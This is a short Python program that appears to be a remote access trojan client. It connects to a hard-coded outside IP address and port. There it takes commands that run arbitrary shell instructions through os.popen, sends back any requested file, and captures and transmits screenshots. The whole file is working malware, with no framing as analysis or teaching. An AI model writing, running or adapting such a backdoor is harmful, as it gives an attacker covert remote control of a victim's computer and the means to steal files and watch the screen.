import os
import socket
import pyautogui

global n
n=0
def filename():
    global n
    n+=1
    return str(n)+'.jpg'

def shot(c):
    im = pyautogui.screenshot()
    file_name = filename()
    im.save(file_name, 'jpeg')
    file_content = None
    try:
        f = open(file_name, 'rb')
        file_content = f.read()
        f.close()
    except:
        c.send("截屏失败".encode("utf-8"))
    if file_content:
        c.send(file_content)
        #os.unlink(file_name)

def sendfile(c,file_name):
    file_content=None
    try:
        f=open(file_name,'rb')
        file_content=f.read()
        f.close()
    except:
        c.send("传送失败".encode("utf-8"))
    if file_content:
        c.send(file_content)
def main():
    c=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    host="66.42.75.46"
    port=9999
    c.connect((host,port))
    while True:
        try:
            option = c.recv(1024).decode("utf-8")
            if option == 'cmd':
                c.send("ok cmd start".encode("utf-8"))
                while True:

                    option1 = c.recv(1024).decode("utf-8")
                    if option1 == 'out':
                        c.send("ok cmd stop".encode("utf-8"))
                        break
                    elif option1=='tran':
                        file_name=c.recv(1024).decode("utf-8")
                        sendfile(c,file_name)
                    else:
                        feedback = os.popen(option1).read()
                        c.send(feedback.encode("utf-8"))
            elif option == 'shot':
                shot(c)
            elif option == 'out':
                c.send("断开链接".encode("utf-8"))
                return 0
            else:
                print(option)
                msg=input("请输入:")
                c.send(msg.encode("utf-8"))
        except:
            c.send("操作有误".encode("utf-8"))
    c.close()

    pass

if __name__ == '__main__':
    main()